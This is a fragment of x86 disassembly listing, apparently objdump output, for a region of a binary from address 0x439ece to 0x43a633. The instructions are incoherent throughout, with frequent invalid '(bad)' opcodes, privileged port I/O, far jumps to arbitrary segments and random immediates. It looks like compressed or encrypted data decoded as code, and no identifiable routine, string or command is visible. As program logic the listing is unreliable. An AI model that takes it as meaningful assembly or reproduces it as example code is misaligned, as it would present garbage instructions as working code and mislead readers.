  439ece:	aaa    
  439ecf:	cmp    DWORD PTR [edx],edx
  439ed1:	(bad)  
  439ed2:	hlt    
  439ed3:	aad    0xbe
  439ed5:	xchg   esp,eax
  439ed6:	aas    
  439ed7:	dec    edx
  439ed8:	test   DWORD PTR [ebx],edx
  439eda:	inc    edi
  439edb:	push   ebx
  439edc:	mov    DWORD PTR [edi],esp
  439ede:	(bad)  
  439edf:	sub    dl,ah
  439ee1:	sub    eax,0xf6967c7e
  439ee6:	adc    edx,esp
  439ee8:	xlat   BYTE PTR gs:[ebx]
  439eea:	scas   eax,DWORD PTR es:[edi]
  439eeb:	dec    esp
  439eec:	mov    ah,0xa3
  439eee:	inc    edi
  439eef:	jmp    0x439f65
  439ef1:	inc    ebx
  439ef2:	push   ds
  439ef3:	(bad)  
  439ef4:	pop    ebp
  439ef5:	scas   eax,DWORD PTR es:[edi]
  439ef6:	and    al,0xe1
  439ef8:	dec    eax
  439ef9:	es icebp 
  439efb:	aad    0xa7
  439efd:	xor    ch,bl
  439eff:	push   edi
  439f00:	mov    ch,0x14
  439f02:	pop    ebp
  439f03:	and    eax,0xb196b983
  439f08:	or     eax,0x27e2e16b
  439f0d:	add    eax,0x5d0ecff
  439f12:	fidivr WORD PTR [eax]
  439f14:	jmp    0x6d0b:0xc1d1cb65
  439f1b:	std    
  439f1c:	mov    esi,0x8e729266
  439f21:	push   esi
  439f22:	popf   
  439f23:	inc    esp
  439f24:	les    ebx,FWORD PTR [edi]
  439f26:	xchg   edx,eax
  439f27:	xlat   BYTE PTR ds:[ebx]
  439f28:	sahf   
  439f29:	xchg   edx,eax
  439f2a:	lahf   
  439f2b:	xor    dl,al
  439f2d:	jge    0x439f85
  439f2f:	sub    al,0xe5
  439f31:	neg    DWORD PTR [edi]
  439f33:	arpl   WORD PTR [ebp-0x26],cx
  439f36:	sbb    edi,DWORD PTR [eax]
  439f38:	outs   dx,BYTE PTR ds:[esi]
  439f39:	inc    esi
  439f3a:	mov    ch,0xc4
  439f3c:	jno    0x439f41
  439f3e:	mov    dh,0x44
  439f40:	xor    eax,0xcc7a3f3c
  439f45:	test   edi,ebp
  439f47:	jecxz  0x439f30
  439f49:	add    al,dl
  439f4b:	dec    ebp
  439f4c:	cmp    al,0x6b
  439f4e:	dec    edx
  439f4f:	mov    BYTE PTR [eax+0xe],0x30
  439f53:	xchg   ebp,eax
  439f54:	mov    ds:0x54548cfd,eax
  439f59:	mov    ch,0x8f
  439f5b:	outs   dx,DWORD PTR ds:[esi]
  439f5c:	inc    esi
  439f5d:	rcr    BYTE PTR [edi],0x5
  439f60:	cmp    eax,0x86704545
  439f65:	mov    al,ds:0xc0bcd451
  439f6a:	cli    
  439f6b:	clc    
  439f6c:	sbb    BYTE PTR [edx-0x76d801],0x2b
  439f73:	dec    eax
  439f74:	(bad)  
  439f75:	mov    esp,DWORD PTR [ecx]
  439f77:	fcomp  QWORD PTR [edi]
  439f79:	add    ebp,esp
  439f7b:	adc    esp,DWORD PTR [ecx]
  439f7d:	sti    
  439f7e:	ret    
  439f7f:	mov    esi,0x63608669
  439f84:	inc    edi
  439f85:	dec    esp
  439f86:	mov    esi,0xf1cfa887
  439f8b:	aam    0x95
  439f8d:	jl     0x439fbc
  439f8f:	out    0xd,eax
  439f91:	add    al,0xef
  439f93:	call   0x4be3:0x43091389
  439f9a:	and    BYTE PTR [eax+0x25],0x2
  439f9e:	sub    BYTE PTR [ecx-0x9cdea8],al
  439fa4:	adc    dl,dl
  439fa6:	js     0xb3636329
  439fac:	xor    al,al
  439fae:	test   al,0xc4
  439fb0:	jle    0x439f4f
  439fb2:	adc    edx,edi
  439fb4:	ss xor eax,0x45a4a28a
  439fba:	adc    BYTE PTR [eax],ah
  439fbc:	mov    BYTE PTR [ecx],cl
  439fbe:	xor    BYTE PTR [edx+ecx*1+0x27],bl
  439fc2:	adc    DWORD PTR [edi+0x6a7c02e8],esp
  439fc8:	call   0x60c7:0xbcd39ed3
  439fcf:	das    
  439fd0:	mov    al,es:0x245ed661
  439fd6:	mov    ah,dl
  439fd8:	fild   DWORD PTR [edx]
  439fda:	cdq    
  439fdb:	adc    eax,0x98cbc644
  439fe0:	mov    BYTE PTR [ebx-0x1e230048],ah
  439fe6:	push   ebx
  439fe7:	nop
  439fe8:	inc    esi
  439fe9:	add    dh,BYTE PTR [eax]
  439feb:	lods   al,BYTE PTR ds:[esi]
  439fec:	xchg   edx,eax
  439fed:	add    al,0xc4
  439fef:	sbb    BYTE PTR [ecx+0x2b],cl
  439ff2:	xchg   ecx,eax
  439ff3:	in     eax,0xb8
  439ff5:	add    eax,0x247d220e
  439ffa:	sub    ch,al
  439ffc:	xchg   esi,eax
  439ffd:	add    bh,BYTE PTR [eax]
  439fff:	push   ebx
  43a000:	and    eax,0xe18e6eaa
  43a005:	retf   
  43a006:	jle    0x43a015
  43a008:	stos   DWORD PTR es:[edi],eax
  43a009:	fdivr  QWORD PTR [ecx+0x19425239]
  43a00f:	fisubr WORD PTR [eax+0x4f]
  43a012:	not    ebp
  43a014:	add    edx,eax
  43a016:	jg     0x43a035
  43a018:	mov    edx,0x89cb09e4
  43a01d:	inc    edi
  43a01e:	pop    esp
  43a01f:	push   esp
  43a020:	hlt    
  43a021:	jo     0x43a08e
  43a023:	gs cmp al,0x3
  43a026:	mov    ss,WORD PTR [edi+0x51d4ab91]
  43a02c:	push   0x6aaa05be
  43a031:	mov    ds:0xff8883b2,eax
  43a036:	add    al,0x48
  43a038:	jnp    0x43a05b
  43a03a:	data16 in al,0xec
  43a03d:	jecxz  0x43a0b0
  43a03f:	aam    0xa9
  43a041:	faddp  st(3),st
  43a043:	jle    0x43a001
  43a045:	outs   dx,DWORD PTR ds:[esi]
  43a046:	ins    DWORD PTR es:[edi],dx
  43a047:	sub    al,0x89
  43a049:	jnp    0x43a0ad
  43a04b:	repnz dec edi
  43a04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a04e:	mov    bh,0xf0
  43a050:	adc    al,0x2
  43a052:	pop    esp
  43a053:	sub    DWORD PTR [ecx+0x6c9508bf],esp
  43a059:	in     eax,0x1f
  43a05b:	lahf   
  43a05c:	sub    dh,al
  43a05e:	xchg   ebx,eax
  43a05f:	sbb    DWORD PTR [edx-0x5e2a2f22],ecx
  43a065:	mov    edx,0x8a208e76
  43a06a:	ret    0x8881
  43a06d:	rol    DWORD PTR [ecx],cl
  43a06f:	and    BYTE PTR [edi],cl
  43a071:	(bad)  
  43a072:	pop    esp
  43a073:	test   DWORD PTR [edx+0x47],esp
  43a076:	lock neg dl
  43a079:	add    dl,dh
  43a07b:	xchg   ebx,eax
  43a07c:	inc    ebp
  43a07d:	jecxz  0x43a0fe
  43a07f:	pop    ds
  43a080:	mov    BYTE PTR [ecx-0x3e8fd365],ch
  43a086:	dec    esp
  43a087:	out    0xb7,al
  43a089:	add    eax,DWORD PTR [edx-0x6eda28df]
  43a08f:	sti    
  43a090:	inc    ebp
  43a091:	add    esp,0x40
  43a094:	mov    ch,bh
  43a096:	push   edx
  43a097:	lahf   
  43a098:	sbb    BYTE PTR [esi-0x73],cl
  43a09b:	sub    al,0xe5
  43a09d:	add    eax,0xd0217240
  43a0a2:	mov    BYTE PTR [esi],ch
  43a0a4:	push   esi
  43a0a5:	cmp    al,0x65
  43a0a7:	pop    ebx
  43a0a8:	mov    al,ds:0xb6a02dc8
  43a0ad:	int3   
  43a0ae:	ret    0x4262
  43a0b1:	sahf   
  43a0b2:	inc    eax
  43a0b3:	push   esp
  43a0b4:	jbe    0x43a064
  43a0b6:	imul   esp,esi,0xd745e938
  43a0bc:	and    BYTE PTR [edx],bh
  43a0be:	adc    BYTE PTR [ebx+0x68],ch
  43a0c1:	xor    al,0x21
  43a0c3:	push   ecx
  43a0c4:	daa    
  43a0c5:	ret    0xe897
  43a0c8:	mov    BYTE PTR [ebx-0x70296ed8],bh
  43a0ce:	cmp    eax,0x88fee027
  43a0d3:	loope  0x43a089
  43a0d5:	add    bh,al
  43a0d7:	repz pusha 
  43a0d9:	mov    BYTE PTR [edx-0x77],dl
  43a0dc:	inc    edi
  43a0dd:	les    ebx,FWORD PTR [esi+esi*1]
  43a0e0:	stc    
  43a0e1:	xchg   ebp,eax
  43a0e2:	jbe    0x43a0b9
  43a0e4:	adc    cl,BYTE PTR [ecx-0x6d353c79]
  43a0ea:	idiv   DWORD PTR [ecx-0x2260dc13]
  43a0f0:	mov    DWORD PTR [ebp-0x1d],ebx
  43a0f3:	mov    ds:0xb2006403,eax
  43a0f8:	mov    DWORD PTR [ebx],esi
  43a0fa:	fbstp  TBYTE PTR [esi+0x6]
  43a0fd:	jnp    0x43a121
  43a0ff:	mov    ds:0x5960033e,al
  43a104:	pop    ecx
  43a105:	rcr    DWORD PTR [eax],0x7e
  43a108:	nop
  43a109:	(bad)  
  43a10a:	xchg   ebp,eax
  43a10b:	xchg   DWORD PTR ds:0xd60fdb03,ebp
  43a111:	stos   DWORD PTR es:[edi],eax
  43a112:	retf   
  43a113:	scas   al,BYTE PTR es:[edi]
  43a114:	add    cl,BYTE PTR [si+0x33]
  43a118:	push   ss
  43a119:	aad    0x6c
  43a11b:	xchg   esp,eax
  43a11c:	fdivr  DWORD PTR ds:0x7ff1c91e
  43a122:	pop    ecx
  43a123:	push   0x14
  43a125:	mov    ebx,DWORD PTR [eax-0x2b]
  43a128:	js     0x43a0aa
  43a12a:	sbb    BYTE PTR [ebp-0x31],bh
  43a12d:	daa    
  43a12e:	mov    esp,DWORD PTR [ebp-0x70]
  43a131:	leave  
  43a132:	mov    esi,0x5966a87c
  43a137:	aad    0xa7
  43a139:	inc    esp
  43a13a:	xchg   ecx,eax
  43a13b:	in     eax,0x6a
  43a13d:	icebp  
  43a13e:	lea    ebp,[ebx-0x77]
  43a141:	cmp    eax,0x43ed999
  43a146:	pop    ecx
  43a147:	cld    
  43a148:	sub    BYTE PTR [ecx+0x5e],cl
  43a14b:	dec    ebp
  43a14c:	hlt    
  43a14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a14e:	inc    esp
  43a14f:	mov    bl,0x49
  43a151:	inc    edi
  43a152:	repz sbb dh,BYTE PTR [ebx+0x202d6009]
  43a159:	std    
  43a15a:	mov    ch,0x3f
  43a15c:	and    dl,cl
  43a15e:	dec    ebp
  43a15f:	fwait
  43a160:	repz mov cl,0xa8
  43a163:	aad    0x45
  43a165:	push   edi
  43a166:	adc    DWORD PTR [ebx-0x6b],edi
  43a169:	mov    dh,0x6d
  43a16b:	mov    ds:0x429ad5c5,eax
  43a170:	xor    edx,esi
  43a172:	pop    edx
  43a173:	pop    eax
  43a174:	stos   DWORD PTR es:[edi],eax
  43a175:	xchg   esp,eax
  43a176:	xchg   ebx,eax
  43a177:	lea    esp,[eax+0x3]
  43a17a:	and    al,0xcd
  43a17c:	nop
  43a17d:	dec    ecx
  43a17e:	mov    dl,0x18
  43a180:	push   esp
  43a181:	dec    ebx
  43a182:	push   ds
  43a183:	pop    ss
  43a184:	out    dx,al
  43a185:	mov    cl,0xdc
  43a187:	div    DWORD PTR [eax-0x1a]
  43a18a:	cmc    
  43a18b:	aam    0x8b
  43a18d:	inc    edi
  43a18e:	sbb    esi,eax
  43a190:	ins    BYTE PTR es:[edi],dx
  43a191:	sub    eax,0xad8fe04c
  43a196:	adc    BYTE PTR [ebp-0x990cdfe],bl
  43a19c:	int3   
  43a19d:	push   edi
  43a19e:	sahf   
  43a19f:	out    dx,al
  43a1a0:	dec    esi
  43a1a1:	add    ebp,DWORD PTR [eax+0x14e9d7bf]
  43a1a7:	call   0x8b61dbb0
  43a1ac:	(bad)  [ebx+ebx*1-0x7a]
  43a1b0:	stos   BYTE PTR es:[edi],al
  43a1b1:	ds (bad) 
  43a1b3:	aam    0x2
  43a1b5:	in     eax,dx
  43a1b6:	stos   DWORD PTR es:[edi],eax
  43a1b7:	pusha  
  43a1b8:	xchg   ebx,eax
  43a1b9:	retf   
  43a1ba:	cdq    
  43a1bb:	sub    ebp,DWORD PTR [edi-0x764de297]
  43a1c1:	xor    DWORD PTR [ecx-0x4b4defbb],eax
  43a1c7:	mov    edx,esi
  43a1c9:	lea    edx,[edx-0x203b32d6]
  43a1cf:	push   eax
  43a1d0:	rol    ebx,0x10
  43a1d3:	in     al,dx
  43a1d4:	mov    DWORD PTR [edi-0x2a7ef800],ebp
  43a1da:	pop    esp
  43a1db:	mov    DWORD PTR fs:[edx],0x424ab712
  43a1e2:	call   0x23ad2c4f
  43a1e7:	dec    ebx
  43a1e8:	mov    ch,0x61
  43a1ea:	and    al,dl
  43a1ec:	or     BYTE PTR [eax+0x1e974eaa],dl
  43a1f2:	mov    ds,WORD PTR [ecx+0x1]
  43a1f5:	cmp    DWORD PTR [esi+0x1a2199a1],edi
  43a1fb:	jge    0x43a279
  43a1fd:	push   0x1e
  43a1ff:	xor    DWORD PTR [ebp+0x56e85fa6],ebp
  43a205:	cmp    edi,DWORD PTR [edx]
  43a207:	clc    
  43a208:	dec    ebp
  43a209:	add    edi,DWORD PTR [esi-0xf7474dd]
  43a20f:	xor    esi,DWORD PTR [eax-0x7f40549d]
  43a215:	mov    edx,0x29d62b60
  43a21a:	inc    edx
  43a21b:	mov    DWORD PTR [ebx+0x3],0x216ee806
  43a222:	cmovno esp,DWORD PTR [ebp-0x52]
  43a226:	add    DWORD PTR [ecx+ecx*4],esp
  43a229:	xchg   ecx,eax
  43a22a:	and    BYTE PTR [eax],cl
  43a22c:	shl    DWORD PTR [esi],1
  43a22e:	or     ebp,DWORD PTR [edi-0x53]
  43a231:	pop    ds
  43a232:	jmp    0x7b65:0x3e94145d
  43a239:	call   0xb5cb:0x4bb75560
  43a240:	jbe    0x43a20d
  43a242:	sbb    ah,dl
  43a244:	mov    DWORD PTR [edx],edx
  43a246:	jae    0x43a21a
  43a248:	and    eax,DWORD PTR [eax+0x44]
  43a24b:	jp     0x43a1d5
  43a24d:	jns    0x43a21c
  43a24f:	popf   
  43a250:	mov    ah,BYTE PTR [esi+0x5a5dce5]
  43a256:	loopne 0x43a1e6
  43a258:	js     0x43a25b
  43a25a:	cmp    al,0x55
  43a25c:	pushf  
  43a25d:	dec    esi
  43a25e:	pop    ds
  43a25f:	rcr    DWORD PTR [ebx+ebx*1+0x12860b0d],1
  43a266:	mov    ds:0xf5b1e1aa,eax
  43a26b:	mov    ds:0xe2e04372,al
  43a270:	(bad)  
  43a271:	fisubr DWORD PTR [eax-0x15]
  43a274:	les    esp,FWORD PTR [ecx-0x28]
  43a277:	dec    esp
  43a278:	mov    cl,BYTE PTR [edx+esi*8]
  43a27b:	retf   0x4b40
  43a27e:	out    dx,eax
  43a27f:	stos   DWORD PTR es:[edi],eax
  43a280:	xchg   ebp,eax
  43a281:	retf   0x755
  43a284:	mov    esp,0x71103ec5
  43a289:	jecxz  0x43a2ee
  43a28b:	xor    esi,DWORD PTR [edx-0x66]
  43a28e:	in     al,0x9f
  43a290:	rol    ebp,0x8a
  43a293:	stc    
  43a294:	cmp    edx,DWORD PTR ds:0xfb1da75e
  43a29a:	out    0xb5,eax
  43a29c:	jg     0x43a30b
  43a29e:	cmp    dl,0x88
  43a2a1:	pop    es
  43a2a2:	xchg   BYTE PTR [edi],cl
  43a2a4:	and    DWORD PTR [ebp-0x64],0xf
  43a2a8:	push   esi
  43a2a9:	idiv   DWORD PTR [ebp+0x6b82ebd4]
  43a2af:	sbb    dl,0x65
  43a2b2:	jge    0x43a253
  43a2b4:	push   DWORD PTR [edi]
  43a2b6:	push   cs
  43a2b7:	aam    0xef
  43a2b9:	cld    
  43a2ba:	mov    al,0x80
  43a2bc:	cmp    al,0x94
  43a2be:	dec    esp
  43a2bf:	aam    0x1f
  43a2c1:	or     cl,al
  43a2c3:	test   esi,ebx
  43a2c5:	mov    bh,0x96
  43a2c7:	and    DWORD PTR [ebp+0x2f04655d],ecx
  43a2cd:	cmp    eax,0x4357b8e7
  43a2d2:	not    BYTE PTR [eax-0x63bd60c2]
  43a2d8:	stc    
  43a2d9:	shl    BYTE PTR [ebp+0x3be26ed6],0xca
  43a2e0:	cmp    al,0x43
  43a2e2:	xor    al,al
  43a2e4:	mov    DWORD PTR [ecx-0x7b7f1b37],edx
  43a2ea:	jp     0x43a355
  43a2ec:	add    DWORD PTR ds:0x270d7646,0xffffffa5
  43a2f3:	ss enter 0x1e2e,0xf1
  43a2f8:	inc    esi
  43a2f9:	test   ch,bl
  43a2fb:	dec    ecx
  43a2fc:	ror    cl,1
  43a2fe:	js     0x43a2b8
  43a300:	dec    edx
  43a301:	or     cl,BYTE PTR [esi]
  43a303:	jle    0x43a34e
  43a305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a306:	les    edx,FWORD PTR [eax+0x6957e652]
  43a30c:	xchg   edx,eax
  43a30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a30e:	pop    ds
  43a30f:	pop    esp
  43a310:	sbb    dl,BYTE PTR [ecx+0x5b068503]
  43a316:	mov    BYTE PTR ds:0xd57646ba,ah
  43a31c:	(bad)  
  43a31d:	call   0xf2101407
  43a322:	popa   
  43a323:	stos   DWORD PTR es:[edi],eax
  43a324:	ja     0x43a30a
  43a326:	mov    es,WORD PTR [ebx-0x3b0745b3]
  43a32c:	popf   
  43a32d:	stos   BYTE PTR es:[edi],al
  43a32e:	jne    0x43a31a
  43a330:	xchg   edi,eax
  43a331:	arpl   WORD PTR [edx],bp
  43a333:	cmp    cl,al
  43a335:	enter  0x597f,0x43
  43a339:	bound  ebx,QWORD PTR [esi]
  43a33b:	or     ebx,esp
  43a33d:	in     al,0xb1
  43a33f:	rol    ah,cl
  43a341:	test   DWORD PTR [ecx],edx
  43a343:	aam    0x6e
  43a345:	pop    edi
  43a346:	iret   
  43a347:	pop    edx
  43a348:	lods   eax,DWORD PTR ds:[esi]
  43a349:	mov    ds:0xef885673,al
  43a34e:	sbb    al,0xcf
  43a350:	sub    eax,0x2a1a30a2
  43a355:	add    ch,BYTE PTR [eax-0x75]
  43a358:	sahf   
  43a359:	mov    cl,0x85
  43a35b:	and    eax,esi
  43a35d:	jle    0x43a3d9
  43a35f:	lods   eax,DWORD PTR ds:[esi]
  43a360:	jle    0x43a36b
  43a362:	cmp    edx,DWORD PTR [edi]
  43a364:	pop    ecx
  43a365:	outs   dx,DWORD PTR ds:[esi]
  43a367:	cmp    ch,BYTE PTR ds:0xbcbc0e47
  43a36d:	add    esi,DWORD PTR [esi]
  43a36f:	es aam 0x68
  43a372:	rcl    DWORD PTR [edi+edi*8+0x33],0x1f
  43a377:	mov    edi,0xea8ea322
  43a37c:	xchg   edx,eax
  43a37d:	test   DWORD PTR [ebp-0x7505f52b],esi
  43a383:	jno    0x43a39f
  43a385:	jle    0x43a3e7
  43a387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a388:	mov    ebp,ecx
  43a38a:	sbb    eax,0xb08e59a5
  43a38f:	jnp    0x43a401
  43a391:	xchg   edx,eax
  43a392:	bswap  esi
  43a394:	mov    BYTE PTR [ecx],dl
  43a396:	xchg   ebp,eax
  43a397:	or     eax,0x1ed9e30b
  43a39c:	mov    bh,ch
  43a39e:	lock adc BYTE PTR [edx],al
  43a3a1:	ins    BYTE PTR es:[edi],dx
  43a3a2:	or     al,0x22
  43a3a4:	retf   0x4b0a
  43a3a7:	scas   al,BYTE PTR es:[edi]
  43a3a8:	daa    
  43a3a9:	pop    ss
  43a3aa:	xchg   edi,eax
  43a3ab:	push   esp
  43a3ac:	mov    DWORD PTR [edx],eax
  43a3ae:	imul   eax,ecx,0xffffffda
  43a3b1:	pop    esp
  43a3b2:	push   ds
  43a3b3:	fisttp DWORD PTR [ebx+0x70ec0111]
  43a3b9:	or     bl,BYTE PTR [edx-0x2c]
  43a3bc:	and    ch,0x5b
  43a3bf:	into   
  43a3c0:	pop    ds
  43a3c1:	mov    bl,0xbb
  43a3c3:	in     eax,0x89
  43a3c5:	inc    ebp
  43a3c6:	mov    bh,0xe3
  43a3c8:	cmc    
  43a3c9:	sbb    ch,BYTE PTR [ebx+0xb]
  43a3cc:	and    bl,ah
  43a3ce:	paddq  mm4,QWORD PTR [edi]
  43a3d1:	in     eax,dx
  43a3d2:	xor    al,0x4a
  43a3d4:	imul   edx,edi,0x5f
  43a3d7:	enter  0x79f8,0xe5
  43a3db:	enter  0x31f5,0x64
  43a3df:	(bad)  
  43a3e0:	xchg   edx,eax
  43a3e1:	mov    edi,0x3770330
  43a3e6:	out    0xc0,eax
  43a3e8:	mov    eax,ss
  43a3ea:	xor    BYTE PTR [ebx+0xf],bl
  43a3ed:	daa    
  43a3ee:	cs sub al,0xe3
  43a3f2:	and    bh,bl
  43a3f4:	ret    
  43a3f5:	ror    BYTE PTR [ecx-0x1bd676ec],1
  43a3fb:	cmp    ebp,esi
  43a3fd:	xor    ch,BYTE PTR [edi-0xdb5bb9a]
  43a403:	out    0xe5,eax
  43a405:	pop    es
  43a406:	push   edi
  43a407:	rcl    DWORD PTR [edx-0x5b],1
  43a40a:	mov    ds,WORD PTR [ecx-0x1b]
  43a40d:	pop    ss
  43a40e:	cmp    al,0x78
  43a410:	rol    DWORD PTR [edx],0x5c
  43a413:	outs   dx,BYTE PTR ds:[esi]
  43a414:	mov    esi,0x888b3bf6
  43a419:	mov    ds:0xe207bb33,eax
  43a41e:	pop    esi
  43a41f:	inc    edi
  43a420:	mov    ebx,0x76c1e636
  43a425:	add    al,BYTE PTR [esi]
  43a427:	popa   
  43a428:	lock scas eax,DWORD PTR es:[edi]
  43a42a:	push   cx
  43a42c:	mov    BYTE PTR [edi],ah
  43a42e:	ds pop edx
  43a430:	mov    esi,0xe9f36035
  43a435:	add    cl,BYTE PTR [eax]
  43a437:	sub    BYTE PTR [esi-0x5d15acde],ch
  43a43d:	xchg   edx,eax
  43a43e:	pusha  
  43a43f:	adc    esp,edx
  43a441:	cdq    
  43a442:	enter  0xc6fe,0x8
  43a446:	ss aam 0x29
  43a449:	stos   DWORD PTR es:[edi],eax
  43a44a:	retf   0x5829
  43a44d:	and    BYTE PTR [ebx],ch
  43a44f:	pusha  
  43a450:	mov    BYTE PTR [edi-0x64],dl
  43a453:	jne    0x43a45b
  43a455:	pop    ecx
  43a456:	aas    
  43a457:	pop    ebp
  43a458:	cs add ecx,esp
  43a45b:	not    al
  43a45d:	retf   
  43a45e:	jnp    0x43a49b
  43a460:	xor    al,0xfa
  43a462:	pop    ds
  43a463:	imul   esp,esp,0x803da3f5
  43a469:	mov    ebp,0xb2f8d717
  43a46e:	cmp    al,0x28
  43a470:	adc    al,0xe
  43a472:	(bad)  
  43a473:	out    0x96,al
  43a475:	xchg   DWORD PTR [esi],edi
  43a477:	mov    bh,0xb9
  43a479:	inc    ebp
  43a47a:	ror    BYTE PTR [esi-0x2b32dcee],0x3f
  43a481:	push   ebx
  43a482:	jns    0x43a4f7
  43a484:	inc    edx
  43a485:	inc    edi
  43a486:	adc    BYTE PTR [ebp-0x49feeb7],al
  43a48c:	jle    0x43a496
  43a48e:	add    DWORD PTR [esi],edi
  43a490:	leave  
  43a491:	loope  0x43a493
  43a493:	aas    
  43a494:	ja     0x43a491
  43a496:	jno    0x43a4d0
  43a498:	sti    
  43a499:	cmc    
  43a49a:	jbe    0x43a475
  43a49c:	dec    eax
  43a49d:	jne    0x43a4d9
  43a49f:	(bad)  
  43a4a0:	mov    bl,ch
  43a4a2:	jo     0x43a511
  43a4a4:	xor    ebx,DWORD PTR [eax+0x2762d54]
  43a4aa:	xchg   esp,eax
  43a4ab:	cmp    edx,DWORD PTR [ebp-0x1c9c4d55]
  43a4b1:	adc    BYTE PTR [edi],bl
  43a4b3:	retf   
  43a4b4:	imul   ecx,DWORD PTR [ecx],0xffffffd2
  43a4b7:	pop    ds
  43a4b8:	ret    0x51d6
  43a4bb:	aam    0xa6
  43a4bd:	xor    edi,DWORD PTR [edx+0x75b1e992]
  43a4c3:	lds    ecx,FWORD PTR [eax-0x4ec1217f]
  43a4c9:	sub    al,0x3d
  43a4cb:	lock (bad) 
  43a4cd:	and    al,BYTE PTR [ebx-0x2b]
  43a4d0:	mov    ecx,0x5ea80423
  43a4d5:	lods   al,BYTE PTR ds:[esi]
  43a4d6:	or     DWORD PTR [edi+0x22e90b88],edx
  43a4dc:	ss scas eax,DWORD PTR es:[edi]
  43a4de:	mov    ebx,DWORD PTR [edi-0x6b]
  43a4e1:	add    eax,0x4de04ac2
  43a4e6:	popf   
  43a4e7:	jmp    0x51ec:0xa95b99ba
  43a4ee:	lahf   
  43a4ef:	sub    dl,BYTE PTR [esi-0x24]
  43a4f2:	mov    ebx,0x4a0261b3
  43a4f7:	cmp    eax,0xab28e58f
  43a4fc:	add    ah,BYTE PTR [eax]
  43a4fe:	ins    BYTE PTR es:[edi],dx
  43a4ff:	adc    DWORD PTR [edi+0x2f],ebx
  43a502:	je     0x43a51c
  43a504:	imul   ecx,DWORD PTR [ebp+0x65],0xee028902
  43a50b:	cmp    al,0x23
  43a50d:	out    dx,eax
  43a50e:	loopne 0x43a534
  43a510:	add    BYTE PTR [ecx-0x2c090ce1],bl
  43a516:	push   0xffffff83
  43a518:	sub    eax,edx
  43a51a:	das    
  43a51b:	push   0x8f10c884
  43a520:	enter  0x593d,0xef
  43a524:	ins    BYTE PTR es:[edi],dx
  43a525:	and    al,0xf2
  43a527:	mov    ds:0x4c97cf49,al
  43a52c:	inc    esp
  43a52d:	pop    esp
  43a52e:	sbb    dh,BYTE PTR [esi-0x207a3a78]
  43a534:	mov    bl,0x7
  43a536:	retf   0xa9ab
  43a539:	sbb    esp,DWORD PTR [edx+0x5c0e9a28]
  43a53f:	aad    0xd7
  43a541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a542:	and    eax,0x1e7234b0
  43a547:	leave  
  43a548:	sbb    al,0x9e
  43a54a:	dec    esp
  43a54b:	sub    BYTE PTR [eax+ecx*8+0x4dbd4be],dh
  43a552:	and    BYTE PTR [eax+0x42],al
  43a555:	iret   
  43a556:	push   esi
  43a557:	mov    esp,0xb0d59ff4
  43a55c:	repnz inc eax
  43a55e:	pop    ds
  43a55f:	jmp    0x43a57e
  43a561:	sub    eax,0x1cb1dab7
  43a566:	mov    edx,0xb48aabc3
  43a56b:	inc    edi
  43a56c:	jmp    0xf6d41eed
  43a571:	push   ebx
  43a572:	mov    ss,ebp
  43a574:	dec    eax
  43a575:	loope  0x43a570
  43a577:	lea    ebp,[esi+eax*1+0x1be6d3f7]
  43a57e:	stos   BYTE PTR es:[edi],al
  43a57f:	push   edx
  43a580:	scas   eax,DWORD PTR es:[edi]
  43a581:	fwait
  43a582:	jo     0x43a53e
  43a584:	shr    BYTE PTR [edi+ebx*1],1
  43a587:	mov    ebx,0x93b0b5fc
  43a58c:	pop    es
  43a58d:	mov    edx,0x4c5c371c
  43a592:	add    eax,0xd943cbd1
  43a597:	loop   0x43a5c2
  43a599:	retf   0x74b0
  43a59c:	(bad)  
  43a59d:	loopne 0x43a5be
  43a59f:	jnp    0x43a530
  43a5a1:	aad    0x68
  43a5a3:	mov    bl,0x56
  43a5a5:	mov    ah,0x5c
  43a5a7:	aad    0x6
  43a5a9:	std    
  43a5aa:	ja     0x43a5e0
  43a5ac:	or     BYTE PTR ds:0xa189a317,ah
  43a5b2:	jl     0x43a553
  43a5b4:	mov    al,0x50
  43a5b6:	js     0x43a580
  43a5b8:	out    dx,eax
  43a5b9:	pop    edi
  43a5bb:	jmp    0xf890:0x74996b88
  43a5c2:	jb     0x43a5fe
  43a5c4:	jg     0x43a61c
  43a5c6:	push   ds
  43a5c7:	leave  
  43a5c8:	mov    BYTE PTR [edx-0x61e22e],cl
  43a5ce:	pop    eax
  43a5cf:	adc    ebp,DWORD PTR [ebx]
  43a5d1:	push   ecx
  43a5d2:	adc    cl,ah
  43a5d4:	pusha  
  43a5d5:	fbld   TBYTE PTR [ebx-0x2b]
  43a5d8:	(bad)  
  43a5d9:	xchg   esi,eax
  43a5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a5db:	add    BYTE PTR [eax],0x19
  43a5de:	sbb    dl,BYTE PTR [esi]
  43a5e0:	mov    bh,ch
  43a5e2:	ffreep st(5)
  43a5e4:	xor    DWORD PTR [edx],eax
  43a5e6:	xor    DWORD PTR [esi],eax
  43a5e8:	jge    0x43a5ed
  43a5ea:	les    ebx,FWORD PTR [ecx]
  43a5ec:	pushf  
  43a5ed:	mov    dl,0x95
  43a5ef:	(bad)  
  43a5f0:	hlt    
  43a5f1:	mov    ecx,0xa18f371f
  43a5f6:	cdq    
  43a5f7:	icebp  
  43a5f8:	pop    eax
  43a5f9:	xchg   ebx,eax
  43a5fa:	push   esi
  43a5fb:	aam    0xba
  43a5fd:	adc    BYTE PTR [edx],bh
  43a5ff:	dec    edx
  43a600:	lods   eax,DWORD PTR ds:[esi]
  43a601:	mov    edx,0x2d882ae8
  43a606:	mov    ebp,0x73f3c234
  43a60b:	pop    ebx
  43a60c:	ss add bl,al
  43a60f:	fwait
  43a610:	div    bh
  43a612:	scas   al,BYTE PTR es:[edi]
  43a613:	ins    BYTE PTR es:[edi],dx
  43a614:	adc    al,0x81
  43a616:	pop    ss
  43a617:	or     edi,DWORD PTR [eax]
  43a619:	push   eax
  43a61a:	mov    eax,ds:0x1c03afd5
  43a61f:	es pop eax
  43a621:	fst    QWORD PTR [ebp-0x17]
  43a624:	mov    dl,bh
  43a626:	mov    ch,dl
  43a628:	int    0x26
  43a62a:	les    ebp,FWORD PTR [ecx+eiz*2-0x14]
  43a62e:	repz pop esp
  43a630:	test   al,0xea
  43a632:	pop    ds
  43a633:	fldcw  WORD PTR [edx-0x327731e3]
